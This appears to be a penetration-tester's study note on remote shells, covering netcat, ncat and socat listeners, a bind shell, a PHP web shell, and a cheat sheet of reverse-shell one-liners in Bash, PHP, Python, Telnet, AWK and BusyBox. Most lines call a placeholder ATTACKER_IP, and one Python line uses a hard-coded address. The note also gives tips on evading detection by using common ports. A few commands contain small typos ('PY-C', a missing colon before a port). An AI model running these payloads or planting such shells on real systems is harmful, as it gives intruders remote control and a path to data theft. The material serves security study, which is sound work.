### Table of contents
- [[#Intro]]
- [[#Reverse Shell]]
- [[#Bind Shell]]
- [[#Shell Listeners]]
- [[#Shell Payloads]]
- [[#Web Shell]]

___
### Intro
[[#Table of contents|Back to the top]]

*Software used to interact with OS*

- **Remote System Control**: execute commands or software remotely in target system
- **Privilege Escalation**
- **Data Exfiltration**: explore system to read and copy sensitive data from it
- **Persistence and Maintenance Access**: create access through users and credentials or copy backdoor software to maintain access to target system for later usage
- **Post-Exploitation Activities**: deploying malware, creating hidden accounts, deleting information, ...
- **Access Other Systems on the Network**: hop through network to different target (aka pivoting)

___
### Reverse Shell
[[#Table of contents|Back to the top]]

*Aka Connect Back Shell, connections initiate from target system to attacker's machine (--> avoid detection)*

1. **Set up Netcat (`nc`) Listener**
**`nc -lvnp 443`**
- `-l`: listen
- `-v`: verbose
- `-n`: prevent connection from using DNS for lookup, it won't resolve hostname
- `-p`: specify port to listen on (443 here)
  Use known ports used by other applications to blend in (53, 80, 8080, 443, 139, 445)

2. **Gain Reverse Shell Access**
Execute reverse shell **[payload](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)**

Example of reverse shell payload
`rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc ATTACKER_IP ATTACKER_PORT >/tmp/f`
- `rm -f /tmp/f`: removes any existing named pipe file located at `/tmp/f/`, ensures that script can create new named pipe without conflicts
- `mkfifo /tmp/f`: creates a named pipe, or FIFO (first-in, first-out), at `/tmp/f`, allow for two-way communication between processes, acts as conduit for input/output
- `cat /tmp/f`: reads data from named pipe, waits for input that can be sent through the pipe
- `| bash -i 2>&1`: output of `cat` is piped to shell instance (`bash -i`) --> attacker can execute commands interactively. `2>&1` redirects standard error to standard output --> error messages are sent back to attacker
- `| nc ATTACKER_IP ATTACKER_PORT >/tmp/f`: pipes shell's output through `nc` to attacker's IP on specified listening port
- `>/tmp/f`: sends output of commands back into named pipe --> bi-directional communication

3. **Receive Shell**

___
### Bind Shell
[[#Table of contents|Back to the top]]

*Bind a port on compromised system, listen for connection. Connection --> attacker gains access to shell session*

Used when target doesn't allow outgoing connections but requires to remain active --> detection

1. **Set up Bind Shell on Target**
**`rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc -l 0.0.0.0 8080 > /tmp/f`**
- `rm -f /tmp/f`: removes any existing named pipe file located at `/tmp/f/`, ensures that script can create new named pipe without conflicts
- `mkfifo /tmp/f`: creates a named pipe, or FIFO (first-in, first-out), at `/tmp/f`, allow for two-way communication between processes, acts as conduit for input/output
- `cat /tmp/f`: reads data from named pipe, waits for input that can be sent through the pipe
- `| bash -i 2>&1`: output of `cat` is piped to shell instance (`bash -i`) --> attacker can execute commands interactively. `2>&1` redirects standard error to standard output --> error messages are sent back to attacker
- `| nc -l 0.0.0.0 8080`: starts Netcat in listen mode (`-l`) on all interfaces (`0.0.0.0`) and port `8080`. The shell will be exposed to the attacker once they connect to this port.
- `>/tmp/f`: sends output of commands back into named pipe --> bi-directional communication

2. **Attacker connect to Bind Shell**
**`nc -nv TARGET_IP 8080`**
- `nc`: start Netcat, establish connection to target
- `-n`: disable DNS resolution
- `-v`: verbose

Listening below port **1024** requires root access / privilege

___
### Shell Listeners
[[#Table of contents|Back to the top]]

*Similar to Netcat*

**Rlwrap**: uses GNU readline library to provide editing keyboard and history
`rlwrap nc -lvnp 443`: wrap netcat in order to able to use arrow keys and history for better interaction

**Ncat**: improved version of Netcat
`ncat -lvnp 4444` (listening to reverse shell)
`ncat --ssl -lvnp 4444` (listening to reverse shell with SSL)

**Socat**: create socket connection between 2 data sources (2 different hosts)
`socat -d -d TCP-LISTEN:443 STDOUT`
- `-d -d`: extra verbose
- `TCP-LISTEN:443`: create TCP listener on port 443, establish server socket for incoming connections
- `STDOUT`: direct incoming data to terminal

___
### Shell Payloads
#### Bash
[[#Table of contents|Back to the top]]

Normal Bash Reverse Shell
```Shell
bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1
```

Bash Read Line Reverse Shell
```Shell
exec 5<>/dev/tcp/ATTACKER_IP/443; cat <&5 | while read line; do $line 2>&5 >&5; done
```
*creates 5 new file descriptors, connects to TCP socket, read and execute commands from socket*

Bash With File Descriptor 196 Reverse Shell
```Shell
0<&196;exec 196<>/dev/tcp/ATTACKER_IP/443; sh <&196 >&196 2>&196 
```
*uses 196 file descriptors to establish TCP connection, read commands and send outputs through same connection*

Bash With File Descriptor 5 Reverse Shell
```Shell
bash -i 5<> /dev/tcp/ATTACKER_IP/443 0<&5 1>&5 2>&5
```
*similar to °1 but uses 5 file descriptors for input and output*

#### PHP
[[#Table of contents|Back to the top]]

PHP Reverse Shell Using the exec Function
```Shell
php -r '$sock=fsockopen("ATTACKER_IP",443);exec("sh <&3 >&3 2>&3");' 
```
*creates socket connection to attacker's IP on port `443`, uses `exec` function to execute shell, redirecting standard input and output*

PHP Reverse Shell Using the shell_exec Function
```Shell
php -r '$sock=fsockopen("ATTACKER_IP",443);shell_exec("sh <&3 >&3 2>&3");'
```
*similar to previous, but uses `shell_exec` function*

PHP Reverse Shell Using the system Function
```Shell
php -r '$sock=fsockopen("ATTACKER_IP",443);system("sh <&3 >&3 2>&3");' 
```
*`system` function, executes command and outputs result to browser*

PHP Reverse Shell Using the passthru Function
```Shell
php -r '$sock=fsockopen("ATTACKER_IP",443);passthru("sh <&3 >&3 2>&3");'
```
*`passthru` function executes command and sends raw output back to browser, useful when working with binary data*

PHP Reverse Shell Using the popen Function
```Shell
php -r '$sock=fsockopen("ATTACKER_IP",443);popen("sh <&3 >&3 2>&3", "r");' 
```
*`popen` opens process file pointer*

#### Python
[[#Table of contents|Back to the top]]

Python Reverse Shell by Exporting Environment Variables
```Shell
export RHOST="ATTACKER_IP"; export RPORT=443; PY-C 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")' 
```
*sets remote host and port as environment variables, creates socket connection, duplicates socket file descriptor for standard input/output.*

Python Reverse Shell Using the subprocess Module
```Shell
PY-C 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.4.99.209",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")' 
```
*`subprocess` module, spawn shell and set up similar environment as Python Reverse Shell by Exporting Environment Variables command*  

Short Python Reverse Shell
```Shell
PY-C 'import os,pty,socket;s=socket.socket();s.connect(("ATTACKER_IP",443));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("bash")'
```
*creates socket (`s`), connects to attacker, redirects standard input, output, error to socket using `os.dup2()`*

#### Others
[[#Table of contents|Back to the top]]

Telnet
```Shell
TF=$(mktemp -u); mkfifo $TF && telnet ATTACKER_IP443 0<$TF | sh 1>$TF
```
*creates named pipe using `mkfifo` and connects to attacker via Telnet* 

AWK
```Shell
awk 'BEGIN {s = "/inet/tcp/0/ATTACKER_IP/443"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
```
*AWK’s built-in TCP capabilities --> connect to `ATTACKER_IP:443`*

BusyBox
```Shell
busybox nc ATTACKER_IP 443 -e sh
```
*uses Netcat (`nc`) to connect to attacker at `ATTACKER_IP:443`, then executes `/bin/sh`, exposing command line to attacker.*


___
### Web Shell
[[#Table of contents|Back to the top]]

*Script written in language supported by compromised web server (PHP, ASP, JSP, simple CGI script), executes commands through web server*

Example: `shell.php`
```php
<?php
if (isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>
```

After shell has been uploaded to web server, it can accessed through URL where shell is hosted. for instance http://target.com/uploads/shell.php
The script specifies the variable `cmd` should be set through GET method
--> `http://target.com/uploads/shell.php?cmd=whoami`


___
### 
[[#Table of contents|Back to the top]]



___
